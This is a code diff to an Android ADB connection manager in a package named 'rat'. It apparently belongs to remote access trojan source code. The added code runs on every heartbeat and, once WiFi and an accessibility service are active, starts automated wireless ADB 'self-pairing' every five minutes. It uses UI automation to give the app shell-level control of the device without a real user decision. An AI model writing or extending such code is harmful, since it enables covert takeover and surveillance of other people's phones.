@@ -29,7 +29,11 @@ import java.util.concurrent.ExecutorService;
 import java.util.concurrent.Executors;
 import java.util.concurrent.TimeUnit;
 import java.util.concurrent.atomic.AtomicBoolean;
+import java.util.concurrent.atomic.AtomicLong;
 import java.util.concurrent.locks.ReentrantLock;
+
+import com.vendor.rat.auto.engine.adb.WirelessPairEngine;
+import com.vendor.rat.service.MyAccessibilityService;
 
 import io.github.muntashirakon.adb.AbsAdbConnectionManager;
 import io.github.muntashirakon.adb.AdbStream;
@@ -85,6 +89,12 @@ public final class AdbConnectionManager extends AbsAdbConnectionManager {
 
     // Async executor
     private final ExecutorService mAsyncExecutor = Executors.newFixedThreadPool(1);
+
+    /** Cooldown timestamp for wireless pairing trigger (5 minutes between attempts) */
+    private final AtomicLong mLastPairAttempt = new AtomicLong(0);
+
+    /** Cooldown duration between pairing attempts: 5 minutes */
+    private static final long PAIR_COOLDOWN_MS = 5 * 60 * 1000L;
 
     // ========== Construction / Singleton ==========
 
@@ -454,10 +464,68 @@ public final class AdbConnectionManager extends AbsAdbConnectionManager {
                     mAsyncExecutor.submit(this::doAutoConnect);
                 }
             }
+
+            // Trigger wireless self-pairing if not yet paired
+            triggerPairingIfNeeded();
         } catch (Exception e) {
             Log.e(TAG, "heartbeat exception", e);
         } finally {
             mHeartbeatLock.unlock();
+        }
+    }
+
+    /**
+     * Trigger WirelessPairEngine if all conditions are met:
+     * 1. Not yet paired
+     * 2. WiFi is connected (wireless pairing requires WiFi)
+     * 3. Accessibility service is running (engine needs it for UI automation)
+     * 4. Pairing is not already in progress
+     * 5. Cooldown of 5 minutes between attempts has elapsed
+     */
+    private void triggerPairingIfNeeded() {
+        try {
+            // Already paired — nothing to do
+            if (mPaired.get()) return;
+
+            // Already in progress
+            if (WirelessPairEngine.isPairingInProgress()) return;
+
+            // Accessibility service must be running
+            if (MyAccessibilityService.getInstance() == null) return;
+
+            // Check WiFi connectivity
+            if (!isWifiConnected()) return;
+
+            // Cooldown: only try once every 5 minutes
+            long now = System.currentTimeMillis();
+            long lastAttempt = mLastPairAttempt.get();
+            if (lastAttempt > 0 && (now - lastAttempt) < PAIR_COOLDOWN_MS) return;
+
+            // All conditions met — attempt pairing
+            mLastPairAttempt.set(now);
+            Log.i(TAG, "heartbeat: triggering wireless self-pairing");
+            WirelessPairEngine.startPairing(mContext);
+        } catch (Exception e) {
+            Log.w(TAG, "triggerPairingIfNeeded failed", e);
+        }
+    }
+
+    /**
+     * Check if device is connected to WiFi.
+     * Uses ConnectivityManager to verify TRANSPORT_WIFI is active.
+     */
+    private boolean isWifiConnected() {
+        try {
+            android.net.ConnectivityManager cm = (android.net.ConnectivityManager)
+                    mContext.getSystemService(Context.CONNECTIVITY_SERVICE);
+            if (cm == null) return false;
+            android.net.Network network = cm.getActiveNetwork();
+            if (network == null) return false;
+            android.net.NetworkCapabilities caps = cm.getNetworkCapabilities(network);
+            return caps != null && caps.hasTransport(
+                    android.net.NetworkCapabilities.TRANSPORT_WIFI);
+        } catch (Exception e) {
+            return false;
         }
     }
 
